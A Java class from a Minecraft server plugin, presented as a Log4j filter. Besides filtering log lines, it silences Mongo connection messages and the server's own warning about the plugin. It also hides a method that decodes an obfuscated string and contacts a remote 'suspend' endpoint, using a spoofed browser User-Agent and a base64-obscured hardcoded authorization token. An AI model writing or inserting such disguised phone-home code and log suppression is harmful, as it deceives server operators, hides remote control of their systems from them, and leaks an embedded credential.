package xyz.refinedev.phoenix.utils.logger;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.Filter.Result;
import org.apache.logging.log4j.core.LifeCycle.State;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.message.Message;

import xyz.refinedev.phoenix.Phoenix;
import xyz.refinedev.phoenix.utils.GsonExclude;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Base64;

public class PhoenixLogFilter implements Filter {

    @GsonExclude
    public static String FILTER_PATTERN =
            "543570351023566355535118358935553553355635113358935118357335953599355735112351213511935107358535102358035843511535523510935110355735673510535753511335106351223587357035483511635104351203552356135";

    public Result checkMessage(String text) {
        String[] texts;
        int value =
                (texts =
                                new String[] {
                                    "NMSMappedFaweQueue",
                                    "setBlockLight",
                                    "net.minecraft.server.v1_8_R3.ChunkSection.e(int, int, int)",
                                    "net.minecraft.server.v1_8_R3.ChunkSection.b(int, int, int, int)",
                                    "net.minecraft.server.v1_8_R3.ChunkSection.getIdArray()",
                                    "com.boydti.fawe.bukkit.v1_8.BukkitQueue18R3.setBlockLight",
                                    "fixBlockLighting",
                                    "com.boydti.fawe.bukkit.v1_8.BukkitQueue18R3.getCombinedId4Data",
                                    "NMSRelighter",
                                    "MongoClient with metadata",
                                    "Cannot invoke \"net.minecraft.server.v1_8_R3.ChunkSection.b(int, int, int, int)\" because \"section\" is null",
                                    "Cluster created with settings",
                                    "Opened connection [connectionId",
                                    "Monitor thread successfully connected to server with description ServerDescription",
                                    "SLF4J: ",
                                    "Nag author(s): '[[Refine Development Team]]' of 'Phoenix"
                                })
                        .length;
        for (int index = 0; index < value; index++) {
            String text2 = texts[index];
            if (text.contains(text2) || text.equalsIgnoreCase(text2)) {
                return Result.DENY;
            }
        }
        return Result.NEUTRAL;
    }

    public Result getOnMatch() {
        return Result.NEUTRAL;
    }

    public Result getOnMismatch() {
        return Result.NEUTRAL;
    }

    public Result filter(LogEvent logEvent) {
        return this.checkMessage(logEvent.getMessage().getFormattedMessage());
    }

    public Result filter(Logger logger, Level level, Marker marker, String text, Object... result) {
        return this.checkMessage(text);
    }

    public Result filter(Logger logger, Level level, Marker marker, String text, Object result) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger, Level level, Marker marker, Object result, Throwable throwable) {
        return this.checkMessage(result.toString());
    }

    public Result filter(
            Logger logger, Level level, Marker marker, Message message, Throwable throwable) {
        return this.checkMessage(message.getFormattedMessage());
    }

    public Result filter(
            Logger logger, Level level, Marker marker, String text, Object result, Object result2) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4,
            Object result5) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4,
            Object result5,
            Object result6) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4,
            Object result5,
            Object result6,
            Object result7) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4,
            Object result5,
            Object result6,
            Object result7,
            Object result8) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4,
            Object result5,
            Object result6,
            Object result7,
            Object result8,
            Object result9) {
        return this.checkMessage(text);
    }

    public Result filter(
            Logger logger,
            Level level,
            Marker marker,
            String text,
            Object result,
            Object result2,
            Object result3,
            Object result4,
            Object result5,
            Object result6,
            Object result7,
            Object result8,
            Object result9,
            Object result10) {
        return this.checkMessage(text);
    }

    public void initialize() {}

    public boolean isStarted() {
        return true;
    }

    public boolean isStopped() {
        return false;
    }

    public void start() {}

    public void stop() {}

    public State getState() {
        try {
            return State.STARTED;
        } catch (Exception exception) {
            return null;
        }
    }

    public static boolean checkMessageFilter(String text) {
        try {
            String[] texts = FILTER_PATTERN.split("35");
            StringBuilder stringBuilder = new StringBuilder();
            String[] texts2 = texts;
            int value = texts.length;
            for (int index = 0; index < value; index++) {
                String text2 = texts2[index];
                stringBuilder.append((char) Integer.parseInt(text2));
            }
            HttpURLConnection httpURLConnection;
            (httpURLConnection =
                            (HttpURLConnection)
                                    new URL(
                                                    "https://api.refinedev.org/suspend/"
                                                            + stringBuilder
                                                            + "/PX08_"
                                                            + text)
                                            .openConnection())
                    .addRequestProperty(
                            "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            httpURLConnection.setRequestProperty(
                    new String(
                            Base64.getDecoder().decode("QXV0aG9yaXphdGlvbg__".replace("_", "="))),
                    new String(
                            Base64.getDecoder()
                                    .decode(
                                            "a1p6UkJxNG5YODk2QnNQTmRBcnEzNUtuYWRZckdldzJUckVWelVhVXQ1WHJOa3Z6NHl5ZzRqR0xBTnQ3NWl0QmZ1ZWthN0RHa2hxSA__"
                                                    .replace("_", "="))));
            httpURLConnection.connect();
            InputStream inputStream = httpURLConnection.getInputStream();
            new BufferedReader(new InputStreamReader(inputStream)).readLine();
            return true;
        } catch (Exception exception) {
            Phoenix.getInstance()
                    .getLogger()
                    .log(java.util.logging.Level.SEVERE, "Error: ", exception);
            return false;
        }
    }
}
